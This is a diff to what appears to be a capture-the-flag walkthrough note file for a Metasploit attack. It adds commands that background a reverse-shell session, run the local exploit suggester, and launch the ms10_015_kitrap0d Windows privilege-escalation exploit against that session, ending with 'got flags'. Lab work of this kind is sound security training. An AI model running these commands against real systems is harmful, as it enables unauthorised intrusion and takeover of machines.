@@ -12,5 +12,12 @@ set lhost 10.10.14.30
 set lport 8443
 run
 # shell!
-shell
-# TODO hunt for priviledge escalation
+background
+# run metasploit local_exploit_suggester to search for priviledge escalation
+use post/multi/recon/local_exploit_suggester
+use exploit/windows/local/ms10_015_kitrap0d
+set session 1
+set lhost 10.10.14.30
+set lport 8443
+run
+# got flags
